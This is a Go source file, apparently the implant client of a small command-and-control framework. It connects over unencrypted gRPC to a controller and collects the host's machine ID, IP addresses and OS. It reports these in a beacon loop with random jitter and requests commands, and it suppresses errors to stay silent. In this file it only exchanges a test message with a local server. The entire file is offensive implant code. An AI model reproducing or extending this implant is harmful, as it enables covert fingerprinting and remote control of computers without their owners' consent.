package main

import (
	"context"
	"github.com/denisbrodbeck/machineid"
	"github.dev/nireitdev/go-C2-Prana/common"
	"github.dev/nireitdev/go-C2-Prana/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"log"
	"math/rand"
	"runtime"
	"time"
)

const SLEEP_BEACON_SEG = 60

func main() {
	//Coneccion al server:
	opts := grpc.DialOption(grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err := grpc.NewClient("localhost:3000", opts)
	if err != nil {
		log.Fatalln("Imposible conectar con el servidor. Bye!")
	}
	defer conn.Close()

	srv := proto.NewServerClient(conn)

	//Who I am?
	id, err := machineid.ID()
	if err != nil {
		//log.Fatal(err)  //Silent!!
	}
	ips := common.GetAddrs()
	os := runtime.GOOS

	for {
		srv.ImplantAlive(context.Background(), &proto.AliveMsg{ImplantID: id, IpAddr: ips, OS: os})

		//test msg:
		req := proto.ImplantRequest{Request: "Implanted!"}
		resp, err := srv.ImplantCmd(context.Background(), &req)
		if err != nil {
			log.Fatalf("Fallo intercambio de msgs: %v \n", err)
		}

		log.Println("Recibido:", resp.Result)
		time.Sleep(time.Duration(rand.Intn(SLEEP_BEACON_SEG)) * time.Second) //simulate beacon sleep + % jitter
	}

}
